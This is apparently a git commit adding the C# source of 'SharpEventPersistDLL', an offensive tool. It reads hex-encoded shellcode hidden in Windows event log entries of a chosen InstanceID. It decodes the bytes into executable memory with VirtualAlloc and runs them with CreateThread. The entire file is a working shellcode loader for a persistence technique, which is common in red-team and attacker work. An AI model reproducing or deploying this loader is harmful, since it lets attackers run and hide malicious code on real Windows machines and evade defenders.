d436cf5cf5665621d4fcf4d7133d69c8631dddf1
MrBaselier <jjbas@xs4all.nl>
2024-07-13 10:56:19 +0200

    Added new changes
    >Resolved loading errors when special symbols (%) occur in the eventlog.
    >Changed the usage notification
    >Embedded Fody for creating stand-alone binaries

---
+++ Program.cs
@@ -0,0 +1,146 @@
+﻿using System;
+using CommandLine;
+using System.Linq;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace SharpEventPersistDLL
+{
+    class Program
+    {
+        public class Options
+        {
+            [Option('i', "instanceid", Required = false, HelpText = "Select an InstanceID Number.")]
+            public string Instanceid { get; set; }
+
+            [Option('s', "source", Required = false, HelpText = "Select a Source.")]
+            public string Source { get; set; }
+
+            //For later use
+            [Option('e', "eventlog", Required = false, HelpText = "Select an Eventlog.")]
+            public string Eventlog { get; set; }
+        }
+
+        static void Main(string[] args)
+        {
+            int instanceId = 0;
+            Parser.Default.ParseArguments<Options>(args)
+                   .WithParsed(options =>
+                   {
+                       if (!string.IsNullOrWhiteSpace(options.Instanceid))
+                       {
+                           Console.WriteLine($"InstanceID is manually set to: {options.Instanceid}");
+                           int.TryParse(options.Instanceid, out instanceId);
+                       }
+                       else
+                       {
+                           Console.WriteLine("You need to set the correct options. \nInstanceID with: \"--instanceid\" or \"-s\" \nSource Eventlog with: \"--eventlog\" or \"-e\"");
+                           System.Environment.Exit(1);
+                       }
+                       if (!string.IsNullOrWhiteSpace(options.Eventlog))
+                       {
+                           Console.WriteLine($"Eventlog is manually set to: {options.Eventlog}");
+                       }
+                       else
+                       {
+                           Console.WriteLine("You need to set the correct options. \nInstanceID with: \"--instanceid\" or \"-s\" \nSource Eventlog with: \"--eventlog\" or \"-e\"");
+                           System.Environment.Exit(1);
+                       }
+
+                       EventLog log = new EventLog(options.Eventlog);
+                       var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == instanceId).Select(x => new
+                       {
+                           x.Message
+                       }).ToList();
+
+                       string shellcodeEvent = string.Empty;
+                       foreach (var entry in entries)
+                       {
+                           //Console.WriteLine(entry);
+                           shellcodeEvent += entry.Message;
+                       }
+
+                       Console.WriteLine(shellcodeEvent);
+                       // Find the index of the '%' character
+                       int index = shellcodeEvent.IndexOf('%');
+                       // If '%' is found, create a substring that excludes it and everything after it
+                       if (index >= 0)
+                       {
+                           shellcodeEvent = shellcodeEvent.Substring(0, index);
+                       }
+                       Console.WriteLine(shellcodeEvent);
+                       byte[] sc = HexStringConverter.ToByteArray(shellcodeEvent);
+                       IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
+                       Marshal.Copy(sc, 0, baseAddr, sc.Length);
+                       IntPtr hThread = CreateThread(IntPtr.Zero, (UIntPtr)0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
+                       WaitForSingleObject(hThread, 0xFFFFFFFF);
+                       return;
+
+                   }
+                   );
+
+        }
+        static class HexStringConverter
+        {
+            public static byte[] ToByteArray(String HexString)
+            {
+                int NumberChars = HexString.Length;
+                byte[] bytes = new byte[NumberChars / 2];
+                for (int i = 0; i < NumberChars; i += 2)
+                {
+                    bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
+                }
+                return bytes;
+            }
+        }
+        [Flags]
+        public enum AllocationType : uint
+        {
+            COMMIT = 0x1000,
+            RESERVE = 0x2000,
+            RESET = 0x80000,
+            LARGE_PAGES = 0x20000000,
+            PHYSICAL = 0x400000,
+            TOP_DOWN = 0x100000,
+            WRITE_WATCH = 0x200000
+        }
+
+        [Flags]
+        public enum MemoryProtection : uint
+        {
+            EXECUTE = 0x10,
+            EXECUTE_READ = 0x20,
+            EXECUTE_READWRITE = 0x40,
+            EXECUTE_WRITECOPY = 0x80,
+            NOACCESS = 0x01,
+            READONLY = 0x02,
+            READWRITE = 0x04,
+            WRITECOPY = 0x08,
+            GUARD_Modifierflag = 0x100,
+            NOCACHE_Modifierflag = 0x200,
+            WRITECOMBINE_Modifierflag = 0x400
+        }
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            AllocationType flAllocationType,
+            MemoryProtection flProtect);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr CreateThread(
+            IntPtr lpThreadAttributes,
+            UIntPtr dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr param,
+            uint dwCreationFlags,
+            IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint WaitForSingleObject(
+            IntPtr hHandle,
+            uint dwMilliseconds);
+
+    }
+}
